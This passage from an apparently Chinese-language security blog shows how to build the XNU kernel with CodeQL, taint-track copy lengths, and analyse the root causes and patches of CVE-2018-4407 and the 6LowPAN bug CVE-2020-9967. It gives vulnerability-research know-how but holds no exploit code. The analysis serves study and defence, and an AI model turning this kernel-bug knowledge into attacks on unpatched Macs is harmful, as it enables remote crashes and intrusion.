build!</span><br><span class="line"></span><br><span class="line">To build the kernel <span class="keyword">for</span> supported x86_64 machines:</span><br><span class="line"><span class="built_in">cd</span> xnu-7195.81.3</span><br><span class="line">make SDKROOT=macosx TARGET_CONFIGS=<span class="string">&quot;RELEASE X86_64 NONE&quot;</span></span><br><span class="line"></span><br><span class="line">To build <span class="keyword">for</span> supported arm64e machines you can, e.g.:</span><br><span class="line"><span class="built_in">cd</span> xnu-7195.81.3</span><br><span class="line">make SDKROOT=macosx KDKROOT=/path/to/KDK TARGET_CONFIGS=<span class="string">&quot;RELEASE ARM64 T8101&quot;</span></span><br><span class="line"></span><br><span class="line">For a table of supported arm64 products, visit:</span><br><span class="line">https://kernelshaman.blogspot.com/2021/02/building-xnu-for-macos-112-intel-apple.html<span class="comment">#xnu-arm64e</span></span><br><span class="line"></span><br><span class="line">See xnu<span class="string">&#x27;s top-level README file for additional build and configuration variables</span></span><br><span class="line"><span class="string">which can be passed on the command line, e.g.,</span></span><br><span class="line"><span class="string">  Speed up the build with: BUILD_LTO=0</span></span><br><span class="line"><span class="string">  Build the development kernel with: KERNEL_CONFIGS=DEVELOPMENT</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Use LOGCOLORS=y to colorize the output</span></span><br><span class="line"><span class="string">Use CONCISE=y to keep all the build output on a single line</span></span><br><span class="line"><span class="string">--------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> xnu-7195.81.3</span><br><span class="line">// 正常编译xnu的命令</span><br><span class="line">make SDKROOT=macosx TARGET_CONFIGS=<span class="string">&quot;RELEASE X86_64 NONE&quot;</span></span><br><span class="line">// 使用codeql编译命令</span><br><span class="line">codeql database create xnu-database --language=cpp --<span class="built_in">command</span>=<span class="string">&quot;make SDKROOT=macosx ARCH_CONFIGS=X86_64 KERNEL_CONFIGS=RELEASE&quot;</span></span><br></pre></td></tr></table></figure><p>剩下的就是等了:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled.png"></p><p>随后可以导入数据库到vscode中使用，也可以使用codecli</p><ul><li>遇到的问题1 ： <code>env: python : Permisson denied</code></li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%201.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%201.png"></p><p>解决：可以尝试更换xcode版本来尝试，我也试过使用root或者使用python virtualenv来规避问题，但是还是不行。</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%202.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%202.png"></p><p>Query测试</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%203.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%203.png"></p><h2 id="Case-study"><a href="#Case-study" class="headerlink" title="Case study"></a>Case study</h2><h3 id="CVE-2018-4407-ping-ping-ping"><a href="#CVE-2018-4407-ping-ping-ping" class="headerlink" title="CVE-2018-4407 - ping ping ping"></a>CVE-2018-4407 - ping ping ping</h3><h4 id="Setup-env"><a href="#Setup-env" class="headerlink" title="Setup env"></a>Setup env</h4><p><a href="https://securitylab.github.com/research/apple-xnu-icmp-error-CVE-2018-4407">Kernel crash caused by out-of-bounds write in Apple’s ICMP packet-handling code (CVE-2018-4407) - GitHub Security Lab</a></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%204.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%204.png"></p><p>以10.13.6为例</p><p>需要低版本的xcode来编译，直接去 <a href="https://developer.apple.com/download/more/"><code>https://developer.apple.com/download/more/</code></a> 下载即可。</p><p>构建 <code>codeql xnu database</code> :</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 老版本 xcode</span><br><span class="line"></span><br><span class="line">make -f Makefile.xnudeps macos_version=10.13.6  xnudeps</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="find-by-codeql"><a href="#find-by-codeql" class="headerlink" title="find by codeql"></a>find by codeql</h4><p>导入 <code>xnu 10.13.6</code> 的database后，先看原作者的query，尝试理解他的思路</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @name mbuf copydata with tainted size</span></span><br><span class="line"><span class="comment"> * @description Calling m_copydata with an untrusted size argument</span></span><br><span class="line"><span class="comment"> *              could cause a buffer overflow.</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity warning</span></span><br><span class="line"><span class="comment"> * @id apple-xnu/cpp/mbuf-copydata-with-tainted-size</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.dataflow.TaintTracking</span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span> <span class="title">extends</span> <span class="title">TaintTracking</span>:</span>:Configuration &#123;</span><br><span class="line">  Config() &#123; <span class="keyword">this</span> = <span class="string">&quot;tcphdr_flow&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source.asExpr().(FunctionCall).getTarget().getName() = <span class="string">&quot;m_mtod&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">override</span> predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    exists (FunctionCall call</span><br><span class="line">    | call.getArgument(<span class="number">2</span>) = sink.asExpr() <span class="keyword">and</span></span><br><span class="line">      call.getTarget().getName().matches(<span class="string">&quot;%copydata&quot;</span>))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, <span class="string">&quot;m_copydata with tainted size.&quot;</span></span><br></pre></td></tr></table></figure><p>原作者使用了污点分析来追踪m_mtod调用到 copydata 长度参数。</p><p>说下具体的source sink的描述把：</p><p>source ： 数据流起点，是一个 函数调用(functioncall)，并且该函数是 <code>m_mtod</code></p><p>sink : “终点”（可以这么理解吧），是 <code>copydata</code> 函数的第三个参数，函数名匹配使用了正则，能匹配到 <code>copydata</code> 系列。</p><p>结果如下：</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%205.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%205.png"></p><p>我认为难点并不是如何写污点分析的query，难点应该是 分析就结果然后<strong>构造poc</strong></p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>从表象来看漏洞出在 <code>m_copydata(n, 0, icmplen, (caddr_t)&amp;icp-&gt;icmp_ip);</code></p><p><a href="https://sourcegraph.com/github.com/apple/darwin-xnu@0a798f6738bc1db01281fc08ae024145e84df927/-/blob/bsd/netinet/ip_icmp.c#L339">ip_icmp.c - apple/darwin-xnu - Sourcegraph</a></p><p>看起来是一个copy数据的时候没有对边界进行检查的“简单的“漏洞，但是Ian beer给作者邮件解释了root casue，这个漏洞发生的本质原因并不是这个地方。</p><p>首先看出现漏洞的函数信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * Generate an error packet of <span class="built_in">type</span> error</span><br><span class="line"> * <span class="keyword">in</span> response to bad packet ip.</span><br><span class="line"> */</span><br><span class="line">void</span><br><span class="line">icmp_error(</span><br><span class="line">    struct mbuf *n,</span><br><span class="line">    int <span class="built_in">type</span>,</span><br><span class="line">    int code,</span><br><span class="line">    u_int32_t dest,</span><br><span class="line">    u_int32_t nextmtu)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数是处理“有问题的IP包”的，返回一个“error packet”给发送者，相当于：发现发过来的IP包有问题之后，生成一个错误信息返回给发送者。</p><p>上面的copy函数是复制原本IP包包头的信息复制到返回包中，出现了问题。根据Ian beer的解释：</p><p>漏洞实际发生在更早的地方：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icp-&gt;icmp_type = <span class="built_in">type</span>;</span><br></pre></td></tr></table></figure><p>那么就要把这个函数从头开始分析一下了，我们重点关注：有问题的数据包在哪里进来的，在哪里被处理的，最终怎么走到copy的逻辑的。</p><p>源头： <code>struct mbuf *n</code>   表示有问题的数据包（incoming packet)，下面贴一下 <code>mbuf</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The mbuf object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mbuf</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">m_hdr</span> <span class="title">m_hdr</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">pkthdr</span> <span class="title">MH_pkthdr</span>;</span>    <span class="comment">/* M_PKTHDR set */</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">m_ext</span> <span class="title">MH_ext</span>;</span>    <span class="comment">/* M_EXT set */</span></span><br><span class="line">                <span class="keyword">char</span>    MH_databuf[_MHLEN];</span><br><span class="line">            &#125; MH_dat;</span><br><span class="line">        &#125; MH;</span><br><span class="line">        <span class="keyword">char</span>    M_databuf[_MLEN];        <span class="comment">/* !M_PKTHDR, !M_EXT */</span></span><br><span class="line">    &#125; M_dat;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>返回的数据包： <code>struct mbuf *m</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (MHLEN &gt; (<span class="keyword">sizeof</span>(struct ip) + ICMP_MINLEN + icmplen))</span><br><span class="line">        m = m_gethdr(M_DONTWAIT, MT_HEADER);    <span class="comment">/* MAC-OK */</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        m = m_getcl(M_DONTWAIT, MT_DATA, M_PKTHDR);</span><br></pre></td></tr></table></figure><p>m的分配和 <code>icmplen</code>  相关：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nlen = m_length(n);</span><br><span class="line">...</span><br><span class="line">icmplen = min(oiphlen + icmpelen, min(nlen, oip-&gt;ip_len));</span><br></pre></td></tr></table></figure><p>处理： <code>m-&gt;m_len = icmplen + ICMP_MINLEN;</code></p><p>这里看起来还没有问题，计算返回包m的长度；</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MH_ALIGN(m, m-&gt;m_len); <span class="comment">// 宏</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 展开之后：</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * As above, for mbufs allocated with m_gethdr/MGETHDR</span></span><br><span class="line"><span class="comment"> * or initialized by M_COPY_PKTHDR.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    MH_ALIGN(m, len)                        \</span></span><br><span class="line"><span class="meta">do &#123;                                    \</span></span><br><span class="line"><span class="meta">    (m)-&gt;m_data += (MHLEN - (len)) &amp;~ (sizeof (long) - 1);        \</span></span><br><span class="line"><span class="meta">&#125; while (0)</span></span><br></pre></td></tr></table></figure><p>这个宏并没有检查 MHLEN 和 len 的大小关系，这里是有整数溢出的。</p><p>在这个场景里， <code>MHLEN</code> 是 88， len是 m→m_len，也就是 <code>icmplen + ICMP_MINLEN;</code> ，如果可以控制 <code>icmplen</code> 大于80，这里就可以触发整数溢出， m_data 指向了其他位置。</p><p>随后使用到这个 <code>已经整数溢出</code> 的长度的地方，并不是copy的逻辑，而是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icp = mtod(m, struct icmp *);</span><br><span class="line">icp-&gt;icmp_type = type; <span class="comment">// oob write here</span></span><br></pre></td></tr></table></figure><p><code>mtod</code> 只是返回了 <code>mbuf</code> 的 data 指针</p><p>宏一步一步展开之后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    mtod(m, t)    ((t)m_mtod(m))</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">m_mtod</span><span class="params">(struct mbuf *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (MTOD(m, <span class="keyword">void</span> *));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Macro version of mtod.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span>    MTOD(m, t)    ((t)((m)-&gt;m_data))</span></span><br></pre></td></tr></table></figure><p>在上面的过程之后，icp指针本来是指向 <code>m_buf</code>的数据部分</p><p>但是整数溢出之后，<code>m→m_data</code> 增加了一个很大的值(&lt;4GB)，最终在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icp-&gt;</span><br><span class="line">icmp_type = type; </span><br></pre></td></tr></table></figure><p>就发生了越解写，<code>root case</code> 分析完毕。</p><h4 id="about-PATCH"><a href="#about-PATCH" class="headerlink" title="about PATCH"></a>about PATCH</h4><p>先说个人理解，直接对 incoming packet的 icmplen 做检查，使得这个长度必须是在合法范围内（根据包结构来计算）</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%206.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%206.png"></p><ul><li>长度必须 大于等于 <code>sizeof(struct ip) + ICMP_MINLEN</code></li><li>长度必须 大于等于 <code>oiphlen+ICMP_MINLEN</code></li></ul><p>后面要计算 返回包长度的时候:</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%207.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%207.png"></p><p>所以这里取到的一定是一个合法的值。</p><p>再看后续根据长度，拷贝数据的逻辑：</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%208.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%208.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icmplen = min(icmplen, M_TRAILINGSPACE(m) -</span><br><span class="line">        <span class="keyword">sizeof</span>(struct ip) - ICMP_MINLEN);</span><br></pre></td></tr></table></figure><p>这个长度是经过计算的，把为m data部分分配的空间大小考虑了进去，这样保证拷贝数据的长度是合法的。</p><p>至此这个洞算是修的没问题了。</p><h3 id="Apple-macOS-6LowPAN-Vulnerability"><a href="#Apple-macOS-6LowPAN-Vulnerability" class="headerlink" title="Apple macOS 6LowPAN Vulnerability"></a>Apple macOS 6LowPAN Vulnerability</h3><p><a href="https://alexplaskett.github.io/CVE-2020-9967/">CVE-2020-9967 - Apple macOS 6LowPAN Vulnerability</a></p><h4 id="Setup-env-1"><a href="#Setup-env-1" class="headerlink" title="Setup env"></a>Setup env</h4><p>有漏洞的版本 <code>10.15.4</code> 为目标，苹果也在Big Sur里做了修复，这些洞影响范围还是比较大的，为了方便起见使用 <code>10.15.4</code> 。 (≤ 10.15.4)</p><p><a href="https://kernelshaman.blogspot.com/2020/09/building-xnu-for-macos-catalina-1015x.html">Building XNU for macOS Catalina 10.15.x</a></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%209.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%209.png"></p><p>随后测试一下数据库可用即可。</p><h4 id="aliyuncs-com-img-codeql-xnu-codeql-xnu-query"><a href="#aliyuncs-com-img-codeql-xnu-codeql-xnu-query" class="headerlink" title="aliyuncs.com/img/codeql_xnu/codeql-xnu query"></a>aliyuncs.com/img/codeql_xnu/codeql-xnu query</h4><p>在这个版本的xnu代码(6153.101.6)，bcopy在xnu中被大量使用，但是实现换成了 <code>builtin___memmove_chk</code> ，所以只需要把 之前污点追踪的 query的sink替换一下即可。</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2010.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2010.png"></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2011.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2011.png"></p><p>能覆盖到这些问题，但是需要挨个结果审计，然后构造poc才行。</p><h4 id="About-6LowPAN"><a href="#About-6LowPAN" class="headerlink" title="About 6LowPAN"></a>About <code>6LowPAN</code></h4><p><code>6LowPAN</code> 在 macOS10.15引入，全称是: <code>IPv6 over Low-Power Wireless Persona Area Networks</code> </p><p>6LoWPAN是一种基于IPv6的低速无线个域网标准，即IPv6 over IEEE 802.15.4。让每个节点可以用IPv6地址联网。这允许节点使用开放标准直接与Internet连接。即使在最小的资源受限设备上也可以应用Internet协议，并且处理能力有限的低功率设备应该能够参与物联网。</p><p><a href="https://zhuanlan.zhihu.com/p/152457583">广域无线物联网及6LoWPAN介绍</a></p><p><a href="https://tools.ietf.org/html/rfc4919">RFC 4919 - IPv6 over Low-Power Wireless Personal Area Networks (6LoWPANs): Overview, Assumptions, Problem Statement, and Goals</a></p><p>（瞎猜一下，感觉这个东西是对应10.15里引入的那个 “以<em>查找</em>未联网Mac 的功能“ ）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">frame802154.c → 802.15.4帧创建和解析逻辑</span><br><span class="line"></span><br><span class="line">if_6lowpan.c → 6LowPAN network interface</span><br><span class="line"></span><br><span class="line">sixlowpan.c → 6LowPAN 压缩/解压逻辑</span><br></pre></td></tr></table></figure><ul><li>IEEE 802.15.4帧格式</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2012.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2012.png"></p><p>frame control 字段：</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2013.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2013.png"></p><p>IPv6报文必须承载在数据帧上。解析帧的时候，首先确定header，随后解析 payload部分。</p><ul><li>LoWPAN Payload</li></ul><p>由于全IPv6报文不符合ieee802.15.4帧的要求，IPv6需要提供适配层来满足MTU的最小要求。该标准还定义了报头压缩的使用，因为预计大多数应用程序将使用IEEE 802.15.4上的IP。</p><p>LoWPAN payload (e.g., an IPv6 packet) 遵循上面的描述；IPv6 头有40字节。</p><p>在初始标准中，定义了 <code>LoWPAN_HC1</code> 压缩IPv6数据报。这意味着6LowPAN的payload 在接收时被压缩。</p><ul><li>Data Link Layer Dispatching 数据链路层分发</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/codeql_xnu/Untitled%2014.png" alt="aliyuncs.com/img/codeql_xnu/codeql-xnu%20+%20XNU%20c4461858b1454816bc8aa7d2f87a674b/Untitled%2014.png"></p><p>首先，我们可以发送一个以太网数据包，该数据包将由demux函数处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span></span></span><br><span class="line"><span class="function"><span class="title">ether_demux</span><span class="params">(<span class="keyword">ifnet_t</span> ifp, <span class="keyword">mbuf_t</span> m, <span class="keyword">char</span> *frame_header,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">protocol_family_t</span> *protocol_family)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ether_header</span> *<span class="title">eh</span> =</span> (struct ether_header *)(<span class="keyword">void</span> *)frame_header;</span><br><span class="line">    u_short  ether_type = eh-&gt;ether_type;</span><br><span class="line">    <span class="keyword">u_int16_t</span> type;</span><br><span class="line">    <span class="keyword">u_int8_t</span> *data;</span><br><span class="line">    <span class="keyword">u_int32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ether_desc_blk_str</span> *<span class="title">desc_blk</span> =</span></span><br><span class="line">        (struct ether_desc_blk_str *)ifp-&gt;if_family_cookie;</span><br><span class="line">    <span class="keyword">u_int32_t</span> maxd = desc_blk ? desc_blk-&gt;n_max_used : <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">en_desc</span>  *<span class="title">ed</span> =</span> desc_blk ? desc_blk-&gt;block_ptr : <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> extProto1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> extProto2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (eh-&gt;ether_dhost[<span class="number">0</span>] &amp; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">/* Check for broadcast */</span></span><br><span class="line">        <span class="keyword">if</span> (_ether_cmp(etherbroadcastaddr, eh-&gt;ether_dhost) == <span class="number">0</span>) &#123;</span><br><span class="line">            m-&gt;m_flags |= M_BCAST;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            m-&gt;m_flags |= M_MCAST;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (m-&gt;m_flags &amp; M_HASFCS) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * If the M_HASFCS is set by the driver we want to make sure</span></span><br><span class="line"><span class="comment">         * that we strip off the trailing FCS data before handing it</span></span><br><span class="line"><span class="comment">         * up the stack.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        m_adj(m, -ETHER_CRC_LEN);</span><br><span class="line">        m-&gt;m_flags &amp;= ~M_HASFCS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((eh-&gt;ether_dhost[<span class="number">0</span>] &amp; <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * When the driver is put into promiscuous mode we may receive</span></span><br><span class="line"><span class="comment">         * unicast frames that are not intended for our interfaces.</span></span><br><span class="line"><span class="comment">         * They are marked here as being promiscuous so the caller may</span></span><br><span class="line"><span class="comment">         * dispose of them after passing the packets to any interface</span></span><br><span class="line"><span class="comment">         * filters.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (_ether_cmp(eh-&gt;ether_dhost, IF_LLADDR(ifp))) &#123;</span><br><span class="line">            m-&gt;m_flags |= M_PROMISC;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* check for IEEE 802.15.4 */</span></span><br><span class="line">    <span class="keyword">if</span> (ether_type == htons(ETHERTYPE_IEEE802154)) &#123;</span><br><span class="line">        *protocol_family = PF_802154;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果以太报头中的 <code>ether_type</code> 是 <code>ETHERTYPE_IEEE802154</code> , 那么该函数会将协议族设置为PF 802154。</p><p>现在，在默认配置中，这个协议族将不会被处理，除非配置了6lowpan接口，这将导致以下代码注册一个函数 <code>sixlowpan_input</code> ，当处理一个802.15.4帧时将被调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span 